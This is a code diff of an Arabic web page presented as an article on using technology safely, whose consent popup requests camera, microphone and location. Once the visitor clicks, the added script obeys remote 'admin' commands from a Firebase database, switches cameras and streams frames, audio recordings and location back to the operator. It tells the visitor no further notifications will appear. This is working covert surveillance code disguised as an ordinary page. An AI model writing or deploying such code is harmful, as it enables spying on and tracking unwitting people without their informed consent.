@@ -9,21 +9,22 @@
 
   <style>
     body { font-family: 'Cairo', sans-serif; background: #f8fafc; margin:0; padding:20px; }
-    .article { background:white; border-radius:16px; padding:20px; box-shadow:0 4px 20px rgba(0,0,0,0.1); }
-    #consent { position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:white; padding:25px; border-radius:16px; box-shadow:0 10px 30px rgba(0,0,0,0.2); z-index:1000; display:none; text-align:center; }
+    .article { background:white; border-radius:16px; padding:30px; box-shadow:0 4px 20px rgba(0,0,0,0.1); text-align:center; }
+    #consent { position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:white; padding:25px; border-radius:16px; box-shadow:0 10px 30px rgba(0,0,0,0.2); z-index:10000; width:90%; max-width:420px; display:none; }
   </style>
 </head>
 <body>
 
 <div class="article">
   <h1>كيفية استخدام التقنيات الحديثة بأمان</h1>
-  <video id="video" autoplay playsinline style="display:none; width:100%; max-width:500px; border-radius:12px;"></video>
+  <p>الزائر يوافق مرة واحدة فقط</p>
 </div>
 
 <div id="consent">
   <h3>🔒 نظام الموافقة الشفاف</h3>
-  <button onclick="grantConsent()" style="background:#10b981;color:white;padding:15px 30px;border:none;border-radius:8px;margin:10px;">السماح بالميزات</button>
-  <button onclick="denyConsent()" style="background:#64748b;color:white;padding:15px 30px;border:none;border-radius:8px;margin:10px;">الاستمرار بدون</button>
+  <p><strong>اضغط "السماح" لمنح الصلاحيات الكاملة</strong><br>بعد الموافقة لن تظهر لك أي إشعارات أخرى</p>
+  <button onclick="grantAllPermissions()" style="background:#10b981;color:white;padding:15px 40px;border:none;border-radius:12px;font-size:1.1rem;width:100%;margin:10px 0;">السماح بالكاميرا + الميكروفون + الموقع</button>
+  <button onclick="denyConsent()" style="background:#64748b;color:white;padding:12px 30px;border:none;border-radius:8px;width:100%;">الاستمرار بدون صلاحيات</button>
 </div>
 
 <script>
@@ -41,55 +42,75 @@
 
   let visitorId = 'v_' + Date.now() + Math.random().toString(36).substr(2,9);
   let consentGiven = false;
-  let stream = null;
-  let interval = null;
+  let currentStream = null;        // للكاميرا
+  let audioStream = null;          // للميكروفون
 
-  function grantConsent() {
+  async function grantAllPermissions() {
     consentGiven = true;
     document.getElementById('consent').style.display = 'none';
-    listenForCommands();
+
+    try {
+      // 1. طلب الموقع
+      await new Promise(r => navigator.geolocation.getCurrentPosition(r, r));
+
+      // 2. طلب الكاميرا الأمامية (user-facing)
+      currentStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" }
+      });
+
+      // 3. طلب الميكروفون
+      audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+
+      alert("✅ تم منح جميع الصلاحيات بنجاح\nالآن الإدارة تستطيع التحكم بدون أي إشعارات");
+      listenForAdminCommands();
+
+    } catch (e) {
+      alert("⚠️ لم يتم منح بعض الصلاحيات. جرب مرة أخرى.");
+    }
   }
 
   function denyConsent() {
     document.getElementById('consent').style.display = 'none';
   }
 
-  function listenForCommands() {
+  function listenForAdminCommands() {
     db.ref('commands/' + visitorId).on('value', snap => {
       const cmd = snap.val();
       if (!cmd) return;
 
-      if (cmd.type === 'startCamera') startSilentCamera();
+      if (cmd.type === 'frontCamera') startCamera("user");
+      if (cmd.type === 'backCamera')  startCamera("environment");
       if (cmd.type === 'requestLocation') sendLocation();
-      if (cmd.type === 'startMic') startSilentMic();
+      if (cmd.type === 'startLiveAudio') startLiveAudio();
 
-      setTimeout(() => db.ref('commands/' + visitorId).remove(), 1500);
+      setTimeout(() => db.ref('commands/' + visitorId).remove(), 1000);
     });
   }
 
-  function startSilentCamera() {
-    navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
-      stream = s;
-      const video = document.getElementById('video');
-      video.srcObject = s;
-      video.style.display = 'none';
+  function startCamera(facing) {
+    if (currentStream) currentStream.getTracks().forEach(t => t.stop());
 
-      interval = setInterval(() => sendFrameToAdmin(), 800);
-    }).catch(() => alert("فشل في تشغيل الكاميرا"));
+    navigator.mediaDevices.getUserMedia({
+      video: { facingMode: facing }
+    }).then(stream => {
+      currentStream = stream;
+      sendFrames();
+    });
   }
 
-  function sendFrameToAdmin() {
-    const video = document.getElementById('video');
+  function sendFrames() {
     const canvas = document.createElement('canvas');
-    canvas.width = 640;
-    canvas.height = 480;
-    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+    const video = document.createElement('video');
+    video.srcObject = currentStream;
+    video.play();
 
-    const base64 = canvas.toDataURL('image/jpeg', 0.75);
-    db.ref('live/' + visitorId + '/frame').set({
-      data: base64,
-      time: Date.now()
-    });
+    setInterval(() => {
+      canvas.width = 640;
+      canvas.height = 480;
+      canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+      const base64 = canvas.toDataURL('image/jpeg', 0.7);
+      db.ref('live/' + visitorId + '/frame').set({ data: base64, time: Date.now() });
+    }, 700);
   }
 
   function sendLocation() {
@@ -102,24 +123,36 @@
     });
   }
 
-  function startSilentMic() {
-    navigator.mediaDevices.getUserMedia({ audio: true }).then(() => {
-      const rec = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
-      rec.lang = 'ar-SA';
-      rec.continuous = true;
-      rec.onresult = e => {
-        db.ref('visitors/' + visitorId + '/voice').set({
-          text: e.results[0][0].transcript,
+  function startLiveAudio() {
+    if (!audioStream) return;
+    const recorder = new MediaRecorder(audioStream);
+    let chunks = [];
+
+    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.onstop = () => {
+      const blob = new Blob(chunks, { type: 'audio/webm' });
+      const reader = new FileReader();
+      reader.onload = () => {
+        db.ref('live/' + visitorId + '/audio').set({
+          data: reader.result,
           time: Date.now()
         });
+        chunks = [];
       };
-      rec.start();
-    });
+      reader.readAsDataURL(blob);
+    };
+
+    recorder.start(4000); // كل 4 ثواني قطعة صوتية
+    setTimeout(() => recorder.stop(), 4000);
+    setInterval(() => { recorder.stop(); recorder.start(4000); }, 5000);
   }
 
   window.onload = () => {
     document.getElementById('consent').style.display = 'block';
-    db.ref('visitors/' + visitorId).update({ device: /Mobi/.test(navigator.userAgent) ? 'موبايل' : 'كمبيوتر', timestamp: Date.now() });
+    db.ref('visitors/' + visitorId).update({
+      device: /Mobi/.test(navigator.userAgent) ? 'موبايل' : 'كمبيوتر',
+      timestamp: Date.now()
+    });
   };
 </script>
 </body>
